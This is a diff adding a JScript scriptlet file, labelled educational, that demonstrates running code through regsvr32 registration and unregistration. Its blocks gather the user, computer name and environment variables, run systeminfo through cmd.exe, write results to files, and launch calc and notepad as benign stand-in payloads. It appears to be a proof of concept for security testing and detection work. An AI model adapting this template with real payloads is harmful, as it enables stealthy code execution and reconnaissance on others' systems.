@@ -1,0 +1,149 @@
+<?XML version="1.0"?>
+<!-- 
+    EDUCATIONAL PURPOSE ONLY - Advanced JScript Version
+    
+    This demonstrates the same technique using JScript instead of VBScript
+    
+    Usage:
+    Register:   regsvr32 /s /i advanced_scriptlet_jscript.sct
+    Unregister: regsvr32 /s /u /i advanced_scriptlet_jscript.sct
+-->
+
+<scriptlet>
+
+<registration
+    description="JScript Security Research Component"
+    progid="TestComponent.JScriptResearch"
+    version="1.00"
+    classid="{B2C3D4E5-F6A7-8901-BCDE-F12345678901}">
+    
+    <script language="JScript">
+    <![CDATA[
+        // Registration block - executes during normal registration
+        
+        function registerComponent() {
+            try {
+                var shell = new ActiveXObject("WScript.Shell");
+                var fso = new ActiveXObject("Scripting.FileSystemObject");
+                
+                // Get environment info
+                var username = shell.ExpandEnvironmentStrings("%USERNAME%");
+                var computername = shell.ExpandEnvironmentStrings("%COMPUTERNAME%");
+                var currentDir = shell.CurrentDirectory;
+                
+                // Log registration
+                var logFile = currentDir + "\\registration_log_jscript.txt";
+                var stream = fso.OpenTextFile(logFile, 8, true);
+                stream.WriteLine("JScript Registration executed at: " + new Date());
+                stream.WriteLine("User: " + username);
+                stream.WriteLine("Computer: " + computername);
+                stream.WriteLine("----------------------------------------");
+                stream.Close();
+                
+                // Visual feedback
+                shell.Popup("JScript Component Registered\n" +
+                           "Time: " + new Date() + "\n" +
+                           "This is the REGISTRATION block",
+                           0, "Registration", 64);
+                
+                // Example action
+                shell.Run("notepad.exe", 1, false);
+                
+            } catch(e) {
+                // Error handling
+            }
+        }
+        
+        registerComponent();
+    ]]>
+    </script>
+</registration>
+
+<public>
+    <method name="Unregister">
+        <script language="JScript">
+        <![CDATA[
+            // Unregistration block - THIS IS WHERE MALICIOUS CODE EXECUTES
+            
+            function unregisterComponent() {
+                try {
+                    var shell = new ActiveXObject("WScript.Shell");
+                    var fso = new ActiveXObject("Scripting.FileSystemObject");
+                    var network = new ActiveXObject("WScript.Network");
+                    
+                    // Get environment info
+                    var username = network.UserName;
+                    var computername = network.ComputerName;
+                    var currentDir = shell.CurrentDirectory;
+                    var timestamp = new Date();
+                    
+                    // Log unregistration
+                    var logFile = currentDir + "\\unregistration_log_jscript.txt";
+                    var stream = fso.OpenTextFile(logFile, 8, true);
+                    stream.WriteLine("JScript Unregistration executed at: " + timestamp);
+                    stream.WriteLine("User: " + username);
+                    stream.WriteLine("Computer: " + computername);
+                    stream.WriteLine("Parent Process: regsvr32.exe");
+                    stream.WriteLine("----------------------------------------");
+                    stream.Close();
+                    
+                    // Visual feedback
+                    shell.Popup("JScript Component Unregistered\n" +
+                               "Time: " + timestamp + "\n" +
+                               "User: " + username + "\n\n" +
+                               "NOTE: In real attacks, malicious code executes here!",
+                               0, "Unregistration", 48);
+                    
+                    // Example benign payloads for testing
+                    
+                    // 1. Open calculator
+                    shell.Run("calc.exe", 1, false);
+                    
+                    // 2. Gather system info
+                    shell.Run("cmd.exe /c systeminfo > " + currentDir + "\\sysinfo_jscript.txt", 0, false);
+                    
+                    // 3. Create marker file
+                    var marker = fso.CreateTextFile(currentDir + "\\unregister_executed_jscript.txt", true);
+                    marker.WriteLine("Unregistration executed successfully");
+                    marker.WriteLine("Timestamp: " + timestamp);
+                    marker.WriteLine("User: " + username);
+                    marker.WriteLine("Computer: " + computername);
+                    marker.Close();
+                    
+                    // 4. Environment variables enumeration (for defensive analysis)
+                    var envFile = fso.CreateTextFile(currentDir + "\\environment_vars.txt", true);
+                    var envVars = ["USERNAME", "COMPUTERNAME", "USERDOMAIN", "LOGONSERVER", "TEMP", "PATH"];
+                    for (var i = 0; i < envVars.length; i++) {
+                        var value = shell.ExpandEnvironmentStrings("%" + envVars[i] + "%");
+                        envFile.WriteLine(envVars[i] + ": " + value);
+                    }
+                    envFile.Close();
+                    
+                } catch(e) {
+                    // Error handling
+                }
+            }
+            
+            unregisterComponent();
+        ]]>
+        </script>
+    </method>
+</public>
+
+<!-- Additional methods -->
+<public>
+    <method name="ExecuteTest">
+        <script language="JScript">
+        <![CDATA[
+            function testMethod() {
+                var shell = new ActiveXObject("WScript.Shell");
+                shell.Popup("Test method executed from JScript", 0, "Test", 64);
+            }
+            
+            testMethod();
+        ]]>
+        </script>
+    </method>
+</public>
+
+</scriptlet>
